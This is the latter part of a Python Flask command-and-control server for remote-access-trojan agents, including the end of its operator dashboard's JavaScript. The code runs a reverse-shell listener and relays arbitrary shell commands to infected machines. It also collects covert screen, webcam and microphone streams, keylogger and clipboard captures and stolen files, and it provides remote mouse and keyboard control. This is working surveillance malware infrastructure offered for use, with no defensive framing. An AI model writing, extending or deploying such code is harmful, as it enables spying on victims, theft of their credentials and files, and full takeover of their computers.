                statusDiv.className = 'status-indicator status-pending';
                statusDiv.textContent = 'Executing shell command...';

                outputDisplay.textContent = 'Executing shell command... Please wait.';

                const response = await fetch(`/reverse_shell/${selectedAgentId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: command })
                });

                const result = await response.json();

                if (result.status === 'success') {
                    statusDiv.className = 'status-indicator status-success';
                    statusDiv.textContent = 'Shell command executed successfully';
                    document.getElementById('shell-command').value = '';

                    // Display the response in the shell terminal
                    outputDisplay.textContent = result.response || '[No output]';
                } else {
                    statusDiv.className = 'status-indicator status-error';
                    statusDiv.textContent = 'Shell command failed';
                    outputDisplay.textContent = result.message || 'Shell command failed';
                }

                setTimeout(() => {
                    statusDiv.style.display = 'none';
                }, 3000);

            } catch (error) {
                statusDiv.className = 'status-indicator status-error';
                statusDiv.textContent = 'Network error. Could not execute shell command.';
                outputDisplay.textContent = 'Network error occurred.';
                console.error('Error executing shell command:', error);

                setTimeout(() => {
                    statusDiv.style.display = 'none';
                }, 3000);
            }
        }

        // Voice Control Functions
        async function startVoiceControl() {
            if (selectedAgentId) {
                await issueCommandInternal(selectedAgentId, 'start-voice-control');
                showStatus('Voice control started - agent is now listening', 'success');
                document.getElementById('voice-status').style.display = 'block';
                document.getElementById('voice-status').className = 'status-indicator status-success';
                document.getElementById('voice-status').textContent = 'Voice control active - speak your commands';
            } else {
                showStatus('Please select an agent first.', 'error');
            }
        }

        async function stopVoiceControl() {
            if (selectedAgentId) {
                await issueCommandInternal(selectedAgentId, 'stop-voice-control');
                showStatus('Voice control stopped', 'success');
                document.getElementById('voice-status').style.display = 'block';
                document.getElementById('voice-status').className = 'status-indicator status-error';
                document.getElementById('voice-status').textContent = 'Voice control inactive';
                
                setTimeout(() => {
                    document.getElementById('voice-status').style.display = 'none';
                }, 3000);
            } else {
                showStatus('Please select an agent first.', 'error');
            }
        }

        // Enhanced keyboard shortcuts
        document.addEventListener('keydown', function(event) {
            // Enter key in command input
            if (event.target.id === 'command' && event.key === 'Enter') {
                issueCommand();
            }
            // Enter key in shell command input
            if (event.target.id === 'shell-command' && event.key === 'Enter') {
                executeShellCommand();
            }
            // Ctrl+Shift+S for reverse shell
            if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                event.preventDefault();
                switchTab('shell');
                startReverseShell();
            }
            // Ctrl+Shift+V for voice control
            if (event.ctrlKey && event.shiftKey && event.key === 'V') {
                event.preventDefault();
                switchTab('voice');
                startVoiceControl();
            }
            // Ctrl+Shift+M for microphone toggle
            if (event.ctrlKey && event.shiftKey && event.key === 'M') {
                event.preventDefault();
                switchTab('voice');
                toggleMicrophone();
            }
            // Ctrl+Shift+C for command tab
            if (event.ctrlKey && event.shiftKey && event.key === 'C') {
                event.preventDefault();
                switchTab('commands');
            }
        });

        // Helper function to issue commands without showing status to the user (for internal tasks)
        async function issueCommandInternal(agentId, command) {
            if (!agentId) return;
            try {
                await fetch('/issue_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ agent_id: agentId, command: command })
                });
            } catch (error) {
                console.error(`Error issuing internal command '${command}':`, error);
            }
        }

        function showStatus(message, type) {
            const statusDiv = document.getElementById('command-status');
            statusDiv.style.display = 'block';
            statusDiv.className = `status-indicator status-${type}`;
            statusDiv.textContent = message;
            
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        }

        // Remote Control Functions
        let remoteControlActive = false;
        let mouseSensitivity = 1.0;
        let syncMouse = true;
        let syncKeyboard = true;
        let remoteControlArea = null;

        function startRemoteControl() {
            if (!selectedAgentId) {
                showStatus('Please select an agent first.', 'error');
                return;
            }

            remoteControlActive = true;
            remoteControlArea = document.getElementById('remote-control-area');
            const instructions = document.getElementById('remote-instructions');
            const mouseCursor = document.getElementById('mouse-cursor');
            const statusDiv = document.getElementById('remote-status');

            // Update UI
            instructions.style.display = 'none';
            mouseCursor.style.display = 'block';
            statusDiv.style.display = 'block';
            statusDiv.className = 'status-indicator status-success';
            statusDiv.textContent = `Remote control active for agent ${selectedAgentId}`;

            // Set up event listeners
            setupRemoteControlListeners();
            
            showStatus('Remote control started successfully!', 'success');
        }

        function stopRemoteControl() {
            remoteControlActive = false;
            remoteControlArea = null;
            const instructions = document.getElementById('remote-instructions');
            const mouseCursor = document.getElementById('mouse-cursor');
            const statusDiv = document.getElementById('remote-status');

            // Update UI
            instructions.style.display = 'block';
            mouseCursor.style.display = 'none';
            statusDiv.style.display = 'none';

            // Remove event listeners
            removeRemoteControlListeners();
            
            showStatus('Remote control stopped.', 'info');
        }

        function setupRemoteControlListeners() {
            if (!remoteControlArea) return;

            // Mouse movement listener
            remoteControlArea.addEventListener('mousemove', handleMouseMove);
            remoteControlArea.addEventListener('click', handleMouseClick);
            remoteControlArea.addEventListener('contextmenu', handleRightClick);

            // Keyboard listener (global)
            document.addEventListener('keydown', handleKeyDown);
            document.addEventListener('keyup', handleKeyUp);

            // Settings listeners
            const sensitivitySlider = document.getElementById('mouse-sensitivity');
            sensitivitySlider.addEventListener('input', (e) => {
                mouseSensitivity = parseFloat(e.target.value);
                document.getElementById('sensitivity-value').textContent = mouseSensitivity.toFixed(1) + 'x';
            });

            document.getElementById('sync-mouse').addEventListener('change', (e) => {
                syncMouse = e.target.checked;
            });

            document.getElementById('sync-keyboard').addEventListener('change', (e) => {
                syncKeyboard = e.target.checked;
            });
        }

        function removeRemoteControlListeners() {
            if (remoteControlArea) {
                remoteControlArea.removeEventListener('mousemove', handleMouseMove);
                remoteControlArea.removeEventListener('click', handleMouseClick);
                remoteControlArea.removeEventListener('contextmenu', handleRightClick);
            }

            document.removeEventListener('keydown', handleKeyDown);
            document.removeEventListener('keyup', handleKeyUp);
        }

        function handleMouseMove(event) {
            if (!remoteControlActive || !syncMouse) return;

            const rect = remoteControlArea.getBoundingClientRect();
            const x = event.clientX - rect.left;
            const y = event.clientY - rect.top;

            // Update cursor position
            const mouseCursor = document.getElementById('mouse-cursor');
            mouseCursor.style.left = x + 'px';
            mouseCursor.style.top = y + 'px';

            // Calculate relative position (0-1)
            const relativeX = x / rect.width;
            const relativeY = y / rect.height;

            // Send mouse move command to agent
            sendRemoteCommand({
                type: 'mouse_move',
                x: relativeX,
                y: relativeY,
                sensitivity: mouseSensitivity
            });
        }

        function handleMouseClick(event) {
            if (!remoteControlActive || !syncMouse) return;
            
            event.preventDefault();
            sendRemoteCommand({
                type: 'mouse_click',
                button: 'left'
            });
        }

        function handleRightClick(event) {
            if (!remoteControlActive || !syncMouse) return;
            
            event.preventDefault();
            sendRemoteCommand({
                type: 'mouse_click',
                button: 'right'
            });
        }

        function handleKeyDown(event) {
            if (!remoteControlActive || !syncKeyboard) return;

            // Don't interfere with browser shortcuts or UI controls
            if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') return;
            if (event.ctrlKey || event.altKey || event.metaKey) return;

            event.preventDefault();
            sendRemoteCommand({
                type: 'key_down',
                key: event.key,
                code: event.code
            });
        }

        function handleKeyUp(event) {
            if (!remoteControlActive || !syncKeyboard) return;

            // Don't interfere with browser shortcuts or UI controls
            if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') return;
            if (event.ctrlKey || event.altKey || event.metaKey) return;

            event.preventDefault();
            sendRemoteCommand({
                type: 'key_up',
                key: event.key,
                code: event.code
            });
        }

        async function sendRemoteCommand(commandData) {
            if (!selectedAgentId) return;

            try {
                await fetch('/remote_control', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        agent_id: selectedAgentId,
                        ...commandData
                    })
                });
            } catch (error) {
                console.error('Error sending remote command:', error);
            }
        }

        // Auto-refresh agents every 5 seconds
        setInterval(fetchAgents, 5000);

        // Initial fetch
        window.onload = fetchAgents;
    </script>
</body>
</html>
"""

# In-memory storage for multi-agent support.
AGENTS_DATA = defaultdict(lambda: {"commands": [], "output": [], "last_seen": None})

VIDEO_FRAMES = defaultdict(lambda: None)
CAMERA_FRAMES = defaultdict(lambda: None)
AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
KEYLOG_DATA = defaultdict(lambda: [])
CLIPBOARD_DATA = defaultdict(lambda: [])
VOICE_COMMANDS = defaultdict(lambda: queue.Queue())

# Reverse shell connections
REVERSE_SHELL_CONNECTIONS = {}
REVERSE_SHELL_SERVER = None
REVERSE_SHELL_THREAD = None

# --- Reverse Shell Server Functions ---

def handle_reverse_shell_connection(client_socket, client_address):
    """Handle individual reverse shell connections from agents."""
    print(f"Reverse shell connection from {client_address}")
    
    try:
        # Receive initial connection info
        data = client_socket.recv(4096)
        if data:
            connection_info = json.loads(data.decode().strip())
            agent_id = connection_info.get("agent_id")
            
            if agent_id:
                REVERSE_SHELL_CONNECTIONS[agent_id] = {
                    "socket": client_socket,
                    "address": client_address,
                    "info": connection_info,
                    "connected_at": datetime.datetime.utcnow().isoformat()
                }
                print(f"Reverse shell registered for agent {agent_id}")
                
                # Keep connection alive and handle commands
                while True:
                    try:
                        # Check if there are any shell commands to send
                        if agent_id in REVERSE_SHELL_CONNECTIONS:
                            # This would be integrated with a command queue system
                            time.sleep(1)
                        else:
                            break
                    except Exception as e:
                        print(f"Error in reverse shell loop: {e}")
                        break
                        
    except Exception as e:
        print(f"Error handling reverse shell connection: {e}")
    finally:
        # Clean up connection
        for agent_id, conn_info in list(REVERSE_SHELL_CONNECTIONS.items()):
            if conn_info["socket"] == client_socket:
                del REVERSE_SHELL_CONNECTIONS[agent_id]
                print(f"Reverse shell disconnected for agent {agent_id}")
                break
        try:
            client_socket.close()
        except:
            pass

def start_reverse_shell_server():
    """Start the reverse shell server."""
    global REVERSE_SHELL_SERVER, REVERSE_SHELL_THREAD
    
    def server_thread():
        global REVERSE_SHELL_SERVER
        try:
            REVERSE_SHELL_SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            REVERSE_SHELL_SERVER.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            REVERSE_SHELL_SERVER.bind(("0.0.0.0", 9999))
            REVERSE_SHELL_SERVER.listen(5)
            print("Reverse shell server listening on port 9999")
            
            while True:
                try:
                    client_socket, client_address = REVERSE_SHELL_SERVER.accept()
                    # Handle each connection in a separate thread
                    connection_thread = threading.Thread(
                        target=handle_reverse_shell_connection,
                        args=(client_socket, client_address)
                    )
                    connection_thread.daemon = True
                    connection_thread.start()
                except Exception as e:
                    print(f"Error accepting reverse shell connection: {e}")
                    break
        except Exception as e:
            print(f"Error starting reverse shell server: {e}")
    
    if not REVERSE_SHELL_THREAD:
        REVERSE_SHELL_THREAD = threading.Thread(target=server_thread)
        REVERSE_SHELL_THREAD.daemon = True
        REVERSE_SHELL_THREAD.start()

def send_shell_command(agent_id, command):
    """Send a command to a specific agent's reverse shell."""
    if agent_id in REVERSE_SHELL_CONNECTIONS:
        try:
            socket_conn = REVERSE_SHELL_CONNECTIONS[agent_id]["socket"]
            socket_conn.send(command.encode() + b'\n')
            
            # Receive response
            response = socket_conn.recv(4096).decode()
            return response
        except Exception as e:
            print(f"Error sending shell command: {e}")
            return f"Error: {e}"
    else:
        return "No reverse shell connection found for this agent"

# --- Operator-facing endpoints ---

@app.route("/")
def index():
    """
    Redirect root to the dashboard.
    """
    return redirect(url_for('dashboard'))

@app.route("/dashboard")
def dashboard():
    """
    Serves the main HTML dashboard.
    """
    return DASHBOARD_HTML

@app.route("/issue_command", methods=["POST"])
def issue_command():
    """
    Receives a command from the operator and queues it for a specific agent.
    JSON body: { "agent_id": "some_guid", "command": "whoami" }
    """
    data = request.json
    agent_id = data.get("agent_id")
    command = data.get("command")

    if not agent_id or not command:
        return jsonify({"status": "error", "message": "'agent_id' and 'command' are required"}), 400

    AGENTS_DATA[agent_id]["commands"].append(command)
    return jsonify({"status": f"Command queued for agent {agent_id}"})

@app.route("/get_output/<agent_id>", methods=["GET"])
def get_agent_output(agent_id):
    """
    Retrieves and clears the output from a specific agent for the operator.
    """
    if agent_id not in AGENTS_DATA:
        return jsonify({"status": "error", "message": "Agent not found"}), 404
    
    output_list = AGENTS_DATA[agent_id]["output"]
    AGENTS_DATA[agent_id]["output"] = []  # Clear output after retrieval
    
    return jsonify({"agent_id": agent_id, "output": output_list})

@app.route('/stream/<agent_id>', methods=['POST'])
def stream_in(agent_id):
    """Receives a video frame from an agent."""
    VIDEO_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_video_frames(agent_id):
    """Generator function to stream video frames to the dashboard at high FPS."""
    while True:
        time.sleep(0.033) # ~30 FPS (1/30 = 0.033)
        frame = VIDEO_FRAMES.get(agent_id)
        if frame:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app.route('/video_feed/<agent_id>')
def video_feed(agent_id):
    """Serves the MJPEG video stream to the dashboard."""
    return Response(generate_video_frames(agent_id),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/camera/<agent_id>', methods=['POST'])
def camera_in(agent_id):
    """Receives a camera frame from an agent."""
    CAMERA_FRAMES[agent_id] = request.data
    return "OK", 200

def generate_camera_frames(agent_id):
    """Generator function to stream camera frames to the dashboard at high FPS."""
    last_frame_time = time.time()
    while True:
        time.sleep(0.033) # ~30 FPS (1/30 = 0.033)
        frame = CAMERA_FRAMES.get(agent_id)
        if frame:
            last_frame_time = time.time() # Reset timer on new frame
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
        elif time.time() - last_frame_time > 10.0: # 10 second timeout
            print(f"Camera stream for {agent_id} timed out. No frames received.")
            break # Stop the generator, close the connection

@app.route('/camera_feed/<agent_id>')
def camera_feed(agent_id):
    """Serves the MJPEG camera stream to the dashboard."""
    return Response(generate_camera_frames(agent_id),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/audio/<agent_id>', methods=['POST'])
def audio_in(agent_id):
    """Receives an audio chunk from an agent."""
    AUDIO_CHUNKS[agent_id].put(request.data)
    return "OK", 200

def generate_audio_stream(agent_id):
    """Generator function to stream audio chunks as a WAV file."""
    # WAV header parameters
    CHANNELS = 1
    RATE = 44100
    BITS_PER_SAMPLE = 16
    
    # Construct WAV header for an infinitely long stream.
    # The key is to set the file size and data size to maximum (0xFFFFFFFF)
    # to tell the browser to just keep reading.
    header = bytearray()
    header.extend(b'RIFF')
    header.extend((0xFFFFFFFF).to_bytes(4, 'little')) # Max file size for streaming
    header.extend(b'WAVE')
    header.extend(b'fmt ')
    header.extend((16).to_bytes(4, 'little')) # Sub-chunk size
    header.extend((1).to_bytes(2, 'little')) # PCM format
    header.extend(CHANNELS.to_bytes(2, 'little'))
    header.extend(RATE.to_bytes(4, 'little'))
    header.extend((RATE * CHANNELS * BITS_PER_SAMPLE // 8).to_bytes(4, 'little')) # Byte rate
    header.extend((CHANNELS * BITS_PER_SAMPLE // 8).to_bytes(2, 'little')) # Block align
    header.extend(BITS_PER_SAMPLE.to_bytes(2, 'little'))
    header.extend(b'data')
    header.extend((0xFFFFFFFF).to_bytes(4, 'little')) # Max data size for streaming
    yield header

    q = AUDIO_CHUNKS[agent_id]
    while True:
        yield q.get()

@app.route('/audio_feed/<agent_id>')
def audio_feed(agent_id):
    """Serves the WAV audio stream to the dashboard."""
    return Response(generate_audio_stream(agent_id), mimetype='audio/wav')

@app.route("/stream_audio", methods=["POST"])
def stream_audio():
    """Receives live audio stream from dashboard microphone and forwards to agent."""
    if 'audio' not in request.files:
        return jsonify({"status": "error", "message": "No audio data provided"}), 400
    
    audio_file = request.files['audio']
    agent_id = request.form.get('agent_id')
    
    if not agent_id:
        return jsonify({"status": "error", "message": "agent_id required"}), 400
    
    try:
        # Read audio data
        audio_data = audio_file.read()
        
        # Encode audio as base64 for transmission
        audio_b64 = base64.b64encode(audio_data).decode('utf-8')
        
        # Queue live audio command for the agent
        live_audio_command = f"live-audio:{audio_b64}"
        AGENTS_DATA[agent_id]["commands"].append(live_audio_command)
        
        return jsonify({"status": "success", "message": "Live audio streamed to agent"})
        
    except Exception as e:
        print(f"Error processing live audio stream: {e}")
        return jsonify({"status": "error", "message": "Failed to process audio stream"}), 500

@app.route("/agents", methods=["GET"])
def get_agents():
    """
    Lists all agents that have checked in and their last seen time.
    """
    return jsonify(AGENTS_DATA)

# --- File Management Endpoints ---

@app.route("/upload_file", methods=["POST"])
def upload_file():
    """Upload a file to be sent to an agent."""
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file provided"}), 400
    
    file = request.files['file']
    agent_id = request.form.get('agent_id')
    destination_path = request.form.get('destination_path')
    
    if not agent_id or not destination_path:
        return jsonify({"status": "error", "message": "agent_id and destination_path required"}), 400
    
    # Read file content and encode as base64
    file_content = base64.b64encode(file.read()).decode('utf-8')
    
    # Queue the upload command for the agent
    upload_command = f"upload-file:{destination_path}:{file_content}"
    AGENTS_DATA[agent_id]["commands"].append(upload_command)
    
    return jsonify({"status": "success", "message": "File upload queued for agent"})

@app.route("/download_file", methods=["POST"])
def download_file():
    """Request a file download from an agent."""
    data = request.json
    agent_id = data.get("agent_id")
    file_path = data.get("file_path")
    
    if not agent_id or not file_path:
        return jsonify({"status": "error", "message": "agent_id and file_path required"}), 400
    
    # Queue the download command for the agent
    download_command = f"download-file:{file_path}"
    AGENTS_DATA[agent_id]["commands"].append(download_command)
    
    # Wait for the file to be uploaded by the agent (simple polling approach)
    # In a production system, you'd want a more sophisticated mechanism
    import time
    for _ in range(30):  # Wait up to 30 seconds
        time.sleep(1)
        # Check if agent has uploaded the file
        temp_file_path = f"/tmp/download_{agent_id}_{os.path.basename(file_path)}"
        if os.path.exists(temp_file_path):
            return send_file(temp_file_path, as_attachment=True, download_name=os.path.basename(file_path))
    
    return jsonify({"status": "error", "message": "File download timeout"}), 408

@app.route("/file_upload/<agent_id>", methods=["POST"])
def receive_file_from_agent(agent_id):
    """Receive a file uploaded by an agent."""
    data = request.json
    filename = data.get("filename")
    file_content_b64 = data.get("content")
    
    if not filename or not file_content_b64:
        return jsonify({"status": "error", "message": "filename and content required"}), 400
    
    try:
        # Decode base64 content
        file_content = base64.b64decode(file_content_b64)
        
        # Save to temporary file
        temp_file_path = f"/tmp/download_{agent_id}_{filename}"
        with open(temp_file_path, 'wb') as f:
            f.write(file_content)
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# --- Monitoring Endpoints ---

@app.route("/keylog_data/<agent_id>", methods=["POST"])
def receive_keylog_data(agent_id):
    """Receive keylog data from an agent."""
    data = request.json
    keylog_entry = data.get("data")
    
    if keylog_entry:
        KEYLOG_DATA[agent_id].append(keylog_entry)
    
    return jsonify({"status": "received"})

@app.route("/get_keylog_data/<agent_id>", methods=["GET"])
def get_keylog_data(agent_id):
    """Get accumulated keylog data for an agent."""
    data = KEYLOG_DATA[agent_id]
    KEYLOG_DATA[agent_id] = []  # Clear after retrieval
    return jsonify({"data": "\n".join(data)})

@app.route("/clipboard_data/<agent_id>", methods=["POST"])
def receive_clipboard_data(agent_id):
    """Receive clipboard data from an agent."""
    data = request.json
    clipboard_entry = data.get("data")
    
    if clipboard_entry:
        CLIPBOARD_DATA[agent_id].append(clipboard_entry)
    
    return jsonify({"status": "received"})

@app.route("/get_clipboard_data/<agent_id>", methods=["GET"])
def get_clipboard_data(agent_id):
    """Get accumulated clipboard data for an agent."""
    data = CLIPBOARD_DATA[agent_id]
    CLIPBOARD_DATA[agent_id] = []  # Clear after retrieval
    return jsonify({"data": "\n".join(data)})

# --- Shell and Voice Endpoints ---

@app.route("/shell_command", methods=["POST"])
def shell_command():
    """Execute a shell command and return immediate response."""
    data = request.json
    agent_id = data.get("agent_id")
    command = data.get("command")
    
    if not agent_id or not command:
        return jsonify({"status": "error", "message": "agent_id and command required"}), 400
    
    # Queue the command
    AGENTS_DATA[agent_id]["commands"].append(command)
    
    # Wait for response (simplified approach)
    import time
    for _ in range(10):  # Wait up to 10 seconds
        time.sleep(1)
        output_list = AGENTS_DATA[agent_id]["output"]
        if output_list:
            output = output_list.pop(0)
            return jsonify({"output": output})
    
    return jsonify({"output": "Command timeout or no response"})

@app.route("/send_voice", methods=["POST"])
def send_voice():
    """Send voice command to agent."""
    if 'audio' not in request.files:
        return jsonify({"status": "error", "message": "No audio file provided"}), 400
    
    audio_file = request.files['audio']
    agent_id = request.form.get('agent_id')
    
    if not agent_id:
        return jsonify({"status": "error", "message": "agent_id required"}), 400
    
    # Save audio file temporarily
    temp_audio_path = f"/tmp/voice_{agent_id}_{int(time.time())}.wav"
    audio_file.save(temp_audio_path)
    
    # Read and encode audio
    with open(temp_audio_path, 'rb') as f:
        audio_content = base64.b64encode(f.read()).decode('utf-8')
    
    # Queue voice command for agent
    voice_command = f"play-voice:{audio_content}"
    AGENTS_DATA[agent_id]["commands"].append(voice_command)
    
    # Clean up temp file
    os.unlink(temp_audio_path)
    
    return jsonify({"status": "success", "message": "Voice command sent to agent"})

@app.route("/voice_command/<agent_id>", methods=["POST"])
def receive_voice_command(agent_id):
    """Receive voice command from agent and execute it."""
    data = request.json
    command = data.get("command")
    
    if not command:
        return jsonify({"status": "error", "message": "Command required"}), 400
    
    # Add the command to the agent's command queue
    AGENTS_DATA[agent_id]["commands"].append(command)
    
    return jsonify({"status": "success", "message": f"Voice command '{command}' queued for execution"})

@app.route("/remote_control", methods=["POST"])
def remote_control():
    """Handle remote control commands (mouse/keyboard)."""
    data = request.json
    agent_id = data.get("agent_id")
    command_type = data.get("type")
    
    if not agent_id or not command_type:
        return jsonify({"status": "error", "message": "agent_id and type required"}), 400
    
    # Queue the remote control command
    remote_command = {
        "type": "remote_control",
        "action": command_type,
        "data": data
    }
    
    AGENTS_DATA[agent_id]["commands"].append(json.dumps(remote_command))
    
    return jsonify({"status": "success"})

@app.route("/reverse_shell/<agent_id>", methods=["POST"])
def reverse_shell_command(agent_id):
    """Send command to agent's reverse shell."""
    data = request.json
    command = data.get("command")
    
    if not command:
        return jsonify({"status": "error", "message": "Command required"}), 400
    
    response = send_shell_command(agent_id, command)
    return jsonify({"status": "success", "response": response})

@app.route("/reverse_shell_status")
def reverse_shell_status():
    """Get status of all reverse shell connections."""
    status = {}
    for agent_id, conn_info in REVERSE_SHELL_CONNECTIONS.items():
        status[agent_id] = {
            "connected": True,
            "address": conn_info["address"],
            "connected_at": conn_info["connected_at"],
            "info": conn_info["info"]
        }
    return jsonify(status)

# --- Agent-facing endpoints ---

@app.route("/get_task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    """
    Called by an agent to get its next command.
    """
    # This serves as a heartbeat, updating the last_seen time.
    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"

    commands = AGENTS_DATA[agent_id]["commands"]
    if commands:
        command = commands.pop(0)
        return jsonify({"command": command})
    
    # If no commands, tell the agent to sleep.
    return jsonify({"command": "sleep"})

@app.route("/post_output/<agent_id>", methods=["POST"])
def post_output(agent_id):
    """
    Called by an agent to post the output of an executed command.
    """
    data = request.json
    output = data.get("output")

    if output is None:
        return jsonify({"status": "error", "message": "'output' is required"}), 400

    AGENTS_DATA[agent_id]["output"].append(output)
    return jsonify({"status": "output received"})

@app.route("/register", methods=["POST"])
def register_agent():
    """Register a new agent with autostart capabilities"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        agent_id = data.get("id")
        if not agent_id:
            return jsonify({"status": "error", "message": "Agent ID required"}), 400
        
        # Initialize or update agent data
        if agent_id not in AGENTS_DATA:
            AGENTS_DATA[agent_id] = {
                "command": "sleep",
                "output": [],
                "hostname": data.get("hostname", "unknown"),
                "platform": data.get("platform", "unknown"),
                "auto_started": data.get("auto_started", False),
                "capabilities": data.get("capabilities", []),
                "last_seen": datetime.datetime.now(),
                "registration_time": datetime.datetime.now(),
                "connection_count": 1
            }
        else:
            # Update existing agent
            AGENTS_DATA[agent_id]["hostname"] = data.get("hostname", AGENTS_DATA[agent_id].get("hostname", "unknown"))
            AGENTS_DATA[agent_id]["platform"] = data.get("platform", AGENTS_DATA[agent_id].get("platform", "unknown"))
            AGENTS_DATA[agent_id]["capabilities"] = data.get("capabilities", AGENTS_DATA[agent_id].get("capabilities", []))
            AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.now()
            AGENTS_DATA[agent_id]["connection_count"] = AGENTS_DATA[agent_id].get("connection_count", 0) + 1
        
        print(f"Agent {agent_id} registered successfully - Platform: {data.get('platform')}, "
              f"Hostname: {data.get('hostname')}, Auto-started: {data.get('auto_started')}")
        
        return jsonify({
            "status": "success", 
            "message": "Agent registered successfully",
            "agent_id": agent_id,
            "server_time": datetime.datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"Registration error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/status", methods=["GET"])
def server_status():
    """Provide server status for health checks"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.datetime.now().isoformat(),
        "active_agents": len(AGENTS_DATA),
        "version": "3.0-autostart"
    })

@app.route("/agent/<agent_id>/status", methods=["GET"])
def agent_status(agent_id):
    """Get detailed status of a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({"status": "error", "message": "Agent not found"}), 404
    
    agent_data = AGENTS_DATA[agent_id]
    return jsonify({
        "status": "active",
        "agent_id": agent_id,
        "hostname": agent_data.get("hostname", "unknown"),
        "platform": agent_data.get("platform", "unknown"),
        "capabilities": agent_data.get("capabilities", []),
        "auto_started": agent_data.get("auto_started", False),
        "last_seen": agent_data.get("last_seen", "unknown"),
        "registration_time": agent_data.get("registration_time", "unknown"),
        "connection_count": agent_data.get("connection_count", 0),
        "pending_command": agent_data.get("command", "sleep"),
        "output_count": len(agent_data.get("output", []))
    })

if __name__ == "__main__":
    # Start the reverse shell server
    print("Starting reverse shell server...")
    start_reverse_shell_server()
    
    # For deployment on services like Render or Railway, they will use a production WSGI server.
    # The host '0.0.0.0' makes the server accessible externally.
    # IMPORTANT: debug=False is critical for security in a live environment.
    print("Starting Flask web server on port 8080...")
    app.run(host="0.0.0.0", port=8080, debug=False)
